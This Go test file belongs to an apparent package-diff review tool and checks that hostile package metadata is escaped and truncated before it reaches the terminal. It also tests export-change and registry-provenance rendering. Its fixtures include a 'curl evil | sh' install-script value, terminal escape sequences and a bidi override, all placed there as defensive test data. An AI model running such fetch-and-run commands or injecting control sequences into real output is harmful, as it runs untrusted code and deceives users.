package output

// The tests below embed raw control and bidi bytes in string literals on
// purpose, to prove taint() escapes them in output; ST1018 (which suggests
// \u escapes) is exactly the thing under test, so silence it for this file.
//lint:file-ignore ST1018 intentional raw control/bidi bytes in trojan-source fixtures

import (
	"strings"
	"testing"

	"github.com/rvagg/depsound/internal/manifest"
	"github.com/rvagg/depsound/internal/npmpkg"
	"github.com/rvagg/depsound/internal/provenance"
	"github.com/rvagg/depsound/internal/stats"
)

// Attacker-influenced strings must reach the terminal with C0/C1 control
// bytes and bidi overrides escaped and length capped. Keys are as
// attacker-chosen as values.
func TestTextTaintsHostileStrings(t *testing.T) {
	long := strings.Repeat("A", 5000)
	s := &stats.Stats{
		Package: stats.PkgRef{Ecosystem: "npm", Name: "xname", From: "1", To: "2"},
		Runnable: stats.Runnable{
			// attacker-chosen map KEY, not just value
			Lifecycle: []npmpkg.Change{{Key: "pre\x1b]0;pwn\x07install", Status: "added", To: "curl evil | sh\x1b]0;pwned\x07"}},
		},
		Compat: stats.Compat{TypeFrom: "commonjs", TypeTo: "modu‮le"},
		Dependencies: []npmpkg.DepChange{
			{Section: "dependencies", Name: "bad\x1bdep", Status: "added", To: long},
		},
		Files: stats.FilesSection{
			Flagged: []stats.Flag{{Path: "dist/\x07bell.js", Reason: "minified-looking (long lines)"}},
		},
		Notes: []string{"err: \x1b[2Jwiped"},
	}
	out := Text(s)

	for _, raw := range []string{"\x1b", "\x07", "", "‮"} {
		if strings.Contains(out, raw) {
			t.Errorf("raw control/bidi %q reached output", raw)
		}
	}
	if !strings.Contains(out, `\x1b`) {
		t.Error("control bytes should be visibly escaped")
	}
	if strings.Contains(out, long) {
		t.Error("overlong tainted string not capped")
	}
	if !strings.Contains(out, "...[truncated]") {
		t.Error("truncation not marked")
	}
}

func TestTaint(t *testing.T) {
	if got := taint("normal-string.js"); got != "normal-string.js" {
		t.Errorf("benign string altered: %q", got)
	}
	if got := taint("a\x00b\x7fc"); got != `a\x00b\x7fc` {
		t.Errorf("control escape = %q", got)
	}
	if got := taint(string([]byte{0xff, 0xfe})); strings.ContainsRune(got, 0xff) {
		t.Errorf("invalid UTF-8 leaked: %q", got)
	}
	if got := taint("‮"); got != `\x9b\u202e` {
		t.Errorf("C1/bidi escape = %q", got)
	}
	// truncation must cut at a rune boundary, never mid-rune
	long := strings.Repeat("x", 199) + "日本語"
	got := taint(long)
	if !strings.HasSuffix(got, "...[truncated]") || strings.ContainsRune(got, '�') {
		t.Errorf("rune-boundary truncation broken: %q", got)
	}
}

func TestESMImportOnly(t *testing.T) {
	// commander shape: require flips cjs->esm (require breaks), import remains
	commander := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.js (cjs)", To: "./index.js (esm)"},
		{Subpath: ".", Condition: "import", From: "./esm.mjs (esm)", To: "./index.js (esm)"},
	}
	if !esmImportOnly(commander) {
		t.Error("commander cjs->esm require flip should be ESM import-only")
	}
	// require removed entirely, import remains
	removed := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.js (cjs)", To: ""},
		{Subpath: ".", Condition: "import", From: "", To: "./index.mjs (esm)"},
	}
	if !esmImportOnly(removed) {
		t.Error("require removed should be ESM import-only")
	}
	// dual package (require still resolves to CJS) is NOT import-only
	dual := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.cjs (cjs)", To: "./index.cjs (cjs)"},
		{Subpath: ".", Condition: "import", From: "./index.mjs (esm)", To: "./index.mjs (esm)"},
	}
	if esmImportOnly(dual) {
		t.Error("dual package must not read as ESM import-only")
	}
}

func TestCensusRendersRegistryActionsAsFacts(t *testing.T) {
	out := CensusText(&Census{
		Ecosystem: "crates",
		Name:      "arrayref",
		Version:   "0.3.10",
		Files:     1,
		Provenance: &provenance.Result{
			Queried:                     true,
			RegistryActionsSinceVersion: "0.3.9",
			RegistryActionsSince:        "2026-08-20T07:15:00Z",
			RegistryActionsObservedAt:   "2026-08-20T08:00:00Z",
			RegistryActions: []provenance.RegistryAction{
				{Version: "0.3.10", Action: "publish", Actor: "droundy", At: "2026-08-20T07:15:00Z"},
				{Version: "0.3.9", Action: "yank", Actor: "droundy", At: "2026-08-20T07:15:00.100Z"},
			},
		},
	})
	for _, want := range []string{"registry yank/unyank actions since 0.3.9 was published", "2026-08-20T07:15:00.100Z yank 0.3.9 by droundy"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if strings.Contains(out, "publish 0.3.10") {
		t.Errorf("ordinary publish actions should remain JSON-only:\n%s", out)
	}
}

func TestCensusRendersExactDeprecationAndRetractions(t *testing.T) {
	out := CensusText(&Census{
		Ecosystem: "go",
		Name:      "example.com/mod",
		Version:   "v1.0.3",
		Files:     1,
		Provenance: &provenance.Result{
			Queried:               true,
			Deprecated:            true,
			DeprecationScope:      "go-module",
			DeprecationReason:     "use example.com/mod/v2 instead",
			DeprecationSource:     "https://proxy.golang.org/example.com/mod/@v/v1.2.0.mod",
			DeprecationObservedAt: "2026-08-21T01:02:03Z",
			RetractionsVersion:    "v1.2.0",
			RetractionsObservedAt: "2026-08-21T01:02:03Z",
			Retractions: []provenance.Retraction{
				{Low: "v0.9.0", Rationale: "published accidentally"},
				{Low: "v1.0.0", High: "v1.0.5", Rationale: "data corruption", MatchesReviewed: true},
			},
		},
	})
	for _, want := range []string{
		"Go module deprecated by its latest go.mod: use example.com/mod/v2 instead",
		"observed 2026-08-21T01:02:03Z; observation time, not change time",
		"Go retractions declared by v1.2.0 go.mod",
		"[v1.0.0, v1.0.5]: data corruption (matches reviewed version)",
		"v0.9.0: published accidentally",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
}
